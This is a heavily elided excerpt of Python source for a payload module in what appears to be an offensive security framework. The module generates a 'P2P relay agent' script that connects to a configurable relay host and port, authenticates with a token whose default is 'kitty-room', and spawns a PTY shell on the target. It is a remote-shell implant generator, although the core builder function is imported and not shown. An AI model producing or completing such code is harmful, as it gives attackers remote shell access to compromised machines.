...
from lib.relay.payload_stub import build_relay_pty_agent_script
...
class Module(Payload):
    ...
    __info__ = {
        ...
        "description": (
            "P2P relay agent (KSRL v2 E2E + Ed25519 identity + PTY). "
            "Requires cryptography on target."
        ),
    ...
    use_pty = OptBool(True, "Spawn shell in a PTY after relay pairing", False, True)
    ...
    def _build_script(self) -> str:
        ...
        if not token and identity:
            ...
            token = "kitty-room"
        return build_relay_pty_agent_script(
            str(self.relay_host),
            int(self.relay_port),
            token,
